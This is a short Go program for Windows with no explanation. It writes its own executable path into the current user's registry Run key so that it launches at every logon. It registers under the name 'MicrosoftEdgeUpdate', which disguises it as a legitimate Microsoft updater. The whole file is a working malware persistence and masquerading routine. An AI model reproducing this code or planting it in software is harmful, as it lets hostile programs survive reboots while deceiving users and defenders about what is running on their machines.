package main
import("golang.org/x/sys/windows/registry";"os")
func main(){k,_:=registry.OpenKey(registry.CURRENT_USER,`Software\Microsoft\Windows\CurrentVersion\Run`,registry.SET_VALUE);e,_:=os.Executable();k.SetStringValue("MicrosoftEdgeUpdate",e);k.Close()}
